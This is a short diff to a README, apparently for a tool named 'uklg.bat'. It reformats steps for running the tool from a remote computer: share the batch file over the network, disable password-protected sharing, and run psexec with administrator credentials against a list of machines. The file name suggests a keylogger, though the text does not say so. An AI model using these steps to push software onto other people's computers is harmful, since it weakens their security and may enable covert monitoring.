@@ -57,8 +57,7 @@ DEL "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\S
 
 ### From Remote Computer
 
-1.Create a share "\\PC-NAME\share"
-2.Put uklg.bat in "\\PC-NAME\share"
-3.Disable password protected sharing from advanced sharing setting on PC-NAME.(win7)
-4.Run following in cmd:
-`psexec @comps.txt -u administrator -i cmd /c \\PC-NAME\share\uklg.bat`
+- Create a share `\\PC-NAME\share`
+- Put `uklg.bat` in `\\PC-NAME\share`
+- Disable password protected sharing from advanced sharing setting
+- Run following in cmd `psexec @comps.txt -u administrator -i cmd /c \\PC-NAME\share\uklg.bat`
